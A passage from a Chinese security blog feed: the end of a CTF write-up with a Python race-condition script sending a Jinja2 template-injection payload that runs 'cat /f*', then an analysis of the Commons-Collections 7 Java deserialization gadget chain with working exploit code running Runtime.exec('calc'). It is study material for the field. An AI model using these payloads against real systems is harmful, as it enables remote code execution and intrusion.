class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url_send = <span class="string">&quot;http://node1.hgame.vidar.club:31844/app/send&quot;</span></span><br><span class="line">url_read = <span class="string">&quot;http://node1.hgame.vidar.club:31844/app/read&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;g.pop.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">          </span><br><span class="line">            response = requests.post(url_send, data=&#123;<span class="string">&quot;message&quot;</span>: payload&#125;)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Payload sent successfully to <span class="subst">&#123;url_send&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error sending payload: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            response = requests.get(url_read)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response from /read: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error reading message: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    send_thread = threading.Thread(target=send_payload, daemon=<span class="literal">True</span>)</span><br><span class="line">    read_thread = threading.Thread(target=read_message, daemon=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    send_thread.start()</span><br><span class="line">    read_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502101330928.png" alt="image-20250206211914726"></p><p>hgame{yOU-fINd-Th3-key-To_RRRac3_0uUuUt25a5219}</p>]]></content>
    
    
    <summary type="html">false</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Java安全-Commons-Collections 7利用链分析</title>
    <link href="http://example.com/2025/02/02/Java%E5%AE%89%E5%85%A8-Commons-Collections-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2025/02/02/Java%E5%AE%89%E5%85%A8-Commons-Collections-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2025-02-02T15:20:48.000Z</published>
    <updated>2025-02-02T15:23:38.605Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CC7和CC5类似，后半部分也是<code>LazyMap</code></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323858.png" alt="image-20250202152139148"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>我们先从链子的前半部分开始</p><p>先看入口类<code>Hashtable</code>，<code>readObject</code>方法调用了<code>reconstitutionPut</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323835.png" alt="image-20250202152805976"></p><p><code>reconstitutionPut</code>方法调用了<code>equals</code>方法，当然也调用了<code>hashCode</code>方法，如果走<code>hashCode</code>的话又回到了CC6</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323873.png" alt="image-20250202153129663"></p><p>往下调用了<code>LazyMap</code>类的<code>equals</code>方法，但是<code>LazyMap</code>类并没有<code>equals</code>方法，实际上是调用了<code>LazyMap</code>的父类<code>AbstractMapDecorator</code>的<code>equals</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323867.png" alt="image-20250202155530179"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323811.png" alt="image-20250202155859180"></p><p>这里比较了两个<code>key</code>的引用，如果不是同一对象则会再次调用<code>equals</code>方法，<code>map</code>是通过<code>LazyMap</code>传递的，<code>LazyMap</code>链中用<code>decorate</code>方法将<code>HashMap</code>传给了<code>map</code>，所以这里会调用<code>HashMap</code>的<code>equals</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323844.png" alt="image-20250202224545497"></p><p><code>HashMap</code>没有<code>equals</code>方法，但是继承了<code>AbstractMap</code>抽象类，这个类有<code>equals</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323343.png" alt="image-20250202225113303"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323326.png" alt="image-20250202230749178"></p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323501.png" alt="image-20250202193849196"></p><p><code>AbstractMap</code>类的<code>equals</code>方法调用了<code>get</code>方法，这样整条链子就接上了</p><h2 id="构造Exp"><a href="#构造Exp" class="headerlink" title="构造Exp"></a>构造Exp</h2><p>后半段链子</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.ws.spi.Invoker;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>结合入口类</p><p><code>Hashtable</code>类的<code>reconstitutionPut</code>方法</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323496.png" alt="image-20250202200700840"></p><p>这里对传进去的<code>Entry</code>对象数组进行了循环，逐个调用<code>e.key.equals(key)</code>,这里的<code>key</code>如果可控，那么<code>AbstractMap.equals</code>中的<code>m</code>也是可控的</p><p>我们直接将<code>decorateMap</code>传入<code>key</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(decoratedMap, <span class="string">&quot;p0l1st&quot;</span>);</span><br></pre></td></tr></table></figure></div><blockquote><p><code>Hashtable.readObject()</code>方法中的<code>key</code>和<code>value</code>实际上就是通过<code>Hashtable.put()</code>方法放进去的键值对</p></blockquote><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323430.png" alt="image-20250202225430220" style="zoom: 50%;"><p>然后进行序列化反序列化</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(decoratedMap, <span class="string">&quot;p0l1st&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但是却没有弹计算器</p><p>在<code>AbstractMap</code>类的<code>equals</code>方法打个断点，发现根本没执行到这里</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323453.png" alt="image-20250202202122308"></p><p>看看yso的链子</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323693.png" alt="image-20250202202616109"></p><p>相比之下</p><ul><li>多了一个map</li><li>两次put，key分别是yy和zZ</li><li>最后<code>remove</code>了yy</li></ul><p><strong>为什么要调用两次<code>put</code>？</strong></p><p><code>Hashtable</code>的<code>reconstitutionPut</code>方法是被遍历调用的，第一次调用的时候，并不会走到<code>reconstitutionPut</code>方法的for循环里面，因为<code>tab[index]</code>的内容是空的，在下面会对<code>tab[index]</code>进行赋值</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323894.png" alt="image-20250202205617643"></p><p>第二次调用<code>reconstitutionPut</code>时，<code>tab</code>才有值，才能进入for循环从而调用<code>equals</code></p><p><strong>为什么两次<code>put</code>的<code>key</code>分别为yy和zZ？</strong></p><p>第二次调用<code>reconstitutionPut</code>进入for循环的时候，此时的e是从tab中取出的lazyMap1，然后进入判断，需要满足<code>e.hash == hash</code>才能走到<code>e.key.equals</code>方法中。这里判断要求取出来的lazyMap1对象的hash值要等于现在对象lazyMap2的hash值，这里的hash值是通过lazyMap对象中的<code>key.hashCode</code>得到的，也就是说lazyMap1的hash值就是<code>&quot;yy&quot;.hashCode()</code>,lazyMap2的hash值就是<code>&quot;zZ&quot;.hashCode()</code>,而在Java中有一个小bug</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;yy&quot;</span>.hashCode() == <span class="string">&quot;zZ&quot;</span>.hashCode()</span><br></pre></td></tr></table></figure></div><p><code>yy</code>和<code>zZ</code>由<code>hashCode</code>计算出来的值是一样的，所以我们需要将map中<code>put</code>的值设置为<code>yy</code>和<code>zZ</code>，这样才能走到<code>e.key.equals</code>中</p><p><strong>为什么调用完<code>Hashtable.put</code>后，还需要<code>remove</code>掉<code>yy</code>？</strong></p><p>这是因为<code>Hashtable.put</code>实际上也会调用到<code>equals</code>方法</p><p>当调用完<code>equals</code>方法后，lazyMap2的<code>key</code>就会增加一个yy键</p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323927.png" alt="image-20250202215645645" style="zoom:50%;"><p>这就不能满足hash碰撞了，构造序列化链的时候是满足的，但是构造完之后就不满足了，那么经过反序列化也不满足hash碰撞了，也就不会执行命令，所以构造完序列化链之后需要手动删除这多出来的一组键值对</p><p>Exp应该是这样的</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(decorateMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(decorateMap2, <span class="number">1</span>);</span><br><span class="line">        decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>但是这样会弹出两个计算器，序列化的时候就会弹出一个</p><p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202502022323985.png" alt="image-20250202220058590"></p><p>还是老样子先设置为常量再反射修改</p><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>最终Exp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title 